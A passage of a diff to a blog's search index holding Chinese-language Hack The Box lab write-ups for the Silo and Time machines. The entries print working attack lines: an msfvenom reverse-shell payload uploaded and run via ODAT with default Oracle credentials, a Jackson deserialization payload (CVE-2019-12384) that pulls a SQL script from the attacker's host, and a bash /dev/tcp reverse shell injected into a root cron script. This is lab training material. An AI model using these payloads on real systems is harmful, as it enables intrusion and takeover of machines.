+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zilfythb14.webp"
+                     
+                ></p>
+<p>利用msf生成一个反弹shell，并将其上传</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=7777 -f exe -o shell.exe</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3v4z8tcb5tg0.webp"
+                     
+                ></p>
+<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile c:/windows/temp shell.exe /root/shell.exe</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.72mbqrmdtc40.webp"
+                     
+                ></p>
+<p>在利用externaltable模块执行反弹shell</p>
+<p><code>./odat-libc2.17-x86_64 externaltable -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --exec c:/windows/temp shell.exe</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.f31n5tjbzew.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.jo2kfj0yh14.webp"
                      
                 ></p>
 ]]></content>
@@ -14392,226 +14392,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Time - HackTheBox</title>
-    <url>/post/c94f0488a0bb/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.759cdsesknw0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2r5qaycb3n20.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.221tx4jcv39c.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4dkmjtvp40s0.webp"
-                     
-                ></p>
-<p>访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3nbkhal39xo0.webp"
-                     
-                ></p>
-<p>可以选择两个模式</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5q0866u703w0.webp"
-                     
-                ></p>
-<p>输入数字的话就会输出同样的数字</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.37h2gq1hqw80.webp"
-                     
-                ></p>
-<p>输入英文就会输出null</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gtpt37i3w20.webp"
-                     
-                ></p>
-<p>第二个模式直接报错了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.75qrsn6ojdo0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4cyuwh9x1zo.webp"
-                     
-                ></p>
-<p>报错爆出了java的包信息，搜一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6sowgttqfg00.webp"
-                     
-                ></p>
-<p>有个exp，貌似是个Jackson的反序列化</p>
-<p><code>https://github.com/jas502n/CVE-2019-12384</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3go07qvx9pc0.webp"
-                     
-                ></p>
-<p>将项目clone下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
-
-<p>使用这个语句调用exp，先在本地试验一下，用python开启一个http服务</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7dxyth1vvsg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3j2k0d5275a0.webp"
-                     
-                ></p>
-<p>会请求本地的inject.sql文件，之后便会执行文件内容</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7cuz466021c0.webp"
-                     
-                ></p>
-<p>在本地生成了一个txt文件，内部包含执行结果，修改inject.sql文件，反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.63v1n5jwkus0.webp"
-                     
-                ></p>
-<p>在80端口的输入框中执行语句</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5w4zecnfruw0.webp"
-                     
-                ></p>
-<p>第一个模式貌似不起作用</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4kmrfk6yohk0.webp"
-                     
-                ></p>
-<p>换第二个</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5kp7g1vg6fo0.webp"
-                     
-                ></p>
-<p>第二个也不行，还是报错，修改一下exp语句，将jruby test.rb和\都去掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;&quot;&#125;]</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6t8lep53z1k0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60ctbyuv6do0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.1xlflhuk85nk.webp"
-                     
-                ></p>
-<p>发现一个当前用户所有的sh脚本文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5p4bordxcjk0.webp"
-                     
-                ></p>
-<p>这个脚本会将&#x2F;var&#x2F;www&#x2F;html目录下的所有文件进行压缩，并将压缩包移动到&#x2F;root目录下，感觉这像是一个定时执行的文件，用pspy64看一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7hqc8f7rhug0.webp"
-                     
-                ></p>
-<p>确实是定时执行，而且是root用户权限</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60my61pdk2w.webp"
-                     
-                ></p>
-<p>而且当前用户对这个脚本文件是有可读写权限的，加一个反弹shell进去</p>
-<p><code>echo &quot;zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip &amp;&amp; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1&#39;&quot; &gt; /usr/bin/timer_backup.sh</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6dtr00ihv6k0.webp"
-                     
-                ></p>
-<p>当该文件被执行时，会反弹个shell回来</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.b33aaj2yfz4.webp"
-                     
-                ></p>
-<p>反弹是反弹回来了，但是这个会话貌似会在几秒钟以内自动断开，趁着这几秒写一个密钥进去</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2m8oxcdcz9m0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gl1vgsf2ay0.webp"
-                     
-                ></p>
-<p>用密钥登录root用户</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.61kq9qklefc0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Tally - HackTheBox</title>
     <url>/post/c974e9a72087/</url>
     <content><![CDATA[<p><img  
@@ -14946,6 +14726,226 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.76rzoz8oxmw0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Time - HackTheBox</title>
+    <url>/post/c94f0488a0bb/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.759cdsesknw0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2r5qaycb3n20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.221tx4jcv39c.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4dkmjtvp40s0.webp"
+                     
+                ></p>
+<p>访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3nbkhal39xo0.webp"
+                     
+                ></p>
+<p>可以选择两个模式</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5q0866u703w0.webp"
+                     
+                ></p>
+<p>输入数字的话就会输出同样的数字</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.37h2gq1hqw80.webp"
+                     
+                ></p>
+<p>输入英文就会输出null</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gtpt37i3w20.webp"
+                     
+                ></p>
+<p>第二个模式直接报错了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.75qrsn6ojdo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4cyuwh9x1zo.webp"
+                     
+                ></p>
+<p>报错爆出了java的包信息，搜一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6sowgttqfg00.webp"
+                     
+                ></p>
+<p>有个exp，貌似是个Jackson的反序列化</p>
+<p><code>https://github.com/jas502n/CVE-2019-12384</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3go07qvx9pc0.webp"
+                     
+                ></p>
+<p>将项目clone下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用这个语句调用exp，先在本地试验一下，用python开启一个http服务</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7dxyth1vvsg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3j2k0d5275a0.webp"
+                     
+                ></p>
+<p>会请求本地的inject.sql文件，之后便会执行文件内容</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7cuz466021c0.webp"
+                     
+                ></p>
+<p>在本地生成了一个txt文件，内部包含执行结果，修改inject.sql文件，反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.63v1n5jwkus0.webp"
+                     
+                ></p>
+<p>在80端口的输入框中执行语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5w4zecnfruw0.webp"
+                     
+                ></p>
+<p>第一个模式貌似不起作用</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4kmrfk6yohk0.webp"
+                     
+                ></p>
+<p>换第二个</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5kp7g1vg6fo0.webp"
+                     
+                ></p>
+<p>第二个也不行，还是报错，修改一下exp语句，将jruby test.rb和\都去掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6t8lep53z1k0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60ctbyuv6do0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.1xlflhuk85nk.webp"
+                     
+                ></p>
+<p>发现一个当前用户所有的sh脚本文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5p4bordxcjk0.webp"
+                     
+                ></p>
+<p>这个脚本会将&#x2F;var&#x2F;www&#x2F;html目录下的所有文件进行压缩，并将压缩包移动到&#x2F;root目录下，感觉这像是一个定时执行的文件，用pspy64看一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7hqc8f7rhug0.webp"
+                     
+                ></p>
+<p>确实是定时执行，而且是root用户权限</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60my61pdk2w.webp"
+                     
+                ></p>
+<p>而且当前用户对这个脚本文件是有可读写权限的，加一个反弹shell进去</p>
+<p><code>echo &quot;zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip &amp;&amp; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1&#39;&quot; &gt; /usr/bin/timer_backup.sh</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6dtr00ihv6k0.webp"
+                     
+                ></p>
+<p>当该文件被执行时，会反弹个shell回来</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.b33aaj2yfz4.webp"
+                     
+                ></p>
+<p>反弹是反弹回来了，但是这个会话貌似会在几秒钟以内自动断开，趁着这几秒写一个密钥进去</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2m8oxcdcz9m0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gl1vgsf2ay0.webp"
+                     
+                ></p>
+<p>用密钥登录root用户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.61kq9qklefc0.webp"
                      
                 ></p>
 ]]></content>
